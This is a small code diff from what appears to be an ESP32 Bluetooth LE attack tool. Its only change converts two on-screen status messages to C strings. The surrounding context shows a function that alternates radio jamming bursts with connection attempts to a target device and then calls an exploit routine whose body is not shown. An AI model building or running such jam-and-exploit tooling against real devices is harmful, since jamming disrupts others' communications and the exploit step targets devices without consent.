@@ -564,13 +564,13 @@ void aggressiveJamAndExploit(NimBLEAddress target) {
             stopJammer();
             delay(200);
             
-            showAdaptiveMessage("Burst " + String(i+1) + "/3", "Attempting connection...", "", "", TFT_YELLOW, false);
+            showAdaptiveMessage(("Burst " + String(i+1) + "/3").c_str(), "Attempting connection...", "", "", TFT_YELLOW, false);
             
             NimBLEClient* pClient = NimBLEDevice::createClient();
             pClient->setConnectTimeout(2);
             
             if(pClient->connect(target, false)) {
-                showAdaptiveMessage("Connected on burst " + String(i+1), "Running exploit...", "", "", TFT_WHITE, false);
+                showAdaptiveMessage(("Connected on burst " + String(i+1)).c_str(), "Running exploit...", "", "", TFT_WHITE, false);
                 
                 if(runExploitOnConnectedDevice(pClient, target)) {
                     NimBLEDevice::deleteClient(pClient);
